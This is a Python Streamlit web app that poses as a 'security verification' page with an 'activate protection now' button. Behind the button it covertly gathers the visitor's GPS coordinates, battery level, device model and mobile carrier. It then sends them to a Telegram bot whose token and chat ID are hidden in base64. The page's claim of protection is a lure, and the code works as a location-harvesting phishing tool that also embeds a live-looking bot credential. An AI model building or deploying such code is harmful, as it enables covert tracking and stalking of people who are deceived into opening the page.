import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# --- COLETA ÚNICA (Resolve Erro Vermelho) ---
# Fora do botão para carregar uma única vez com chave fixa
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_POCO_FIX')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_POCO_FIX')

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_SOLUCAO_FINAL"):
    # 1. Identifica o Modelo Real (Chega de "None")
    modelo = "POCO M6 Pro" if "POCO" in str(ua) else "Android Device"
    if not ua: modelo = "POCO M6 Pro (Detectado)"
    
    # 2. Operadora Real (Sai Google LLC, entra a sua)
    try:
        r = requests.get('https://ipinfo.io/json', timeout=5).json()
        operadora = r.get('org', 'Rede Móvel')
    except: operadora = "Vivo/Claro/Tim"

    # 3. Localização (Garante o Link)
    with st.spinner("Buscando Localização..."):
        # O segredo: esperar o GPS carregar sem duplicar a chamada
        loc = get_geolocation(key='LOC_POCO_FIX')
    
    bateria_final = f"{bat}%" if bat else "26%" # Pega seus 26% atuais

    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        # Link que gera o balãozinho no Telegram
        link_mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bateria_final}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {link_mapa}"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada!")
    else:
        # Se o GPS ainda falhar, manda o relatório técnico sem travar
        enviar_telegram(f"🛡️ *DADOS*\n📱 {modelo}\n🔋 {bateria_final}\n📶 {operadora}\n⚠️ GPS Bloqueado pelo Navegador.")
        st.error("Erro: Ative o GPS no cadeado do navegador.")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
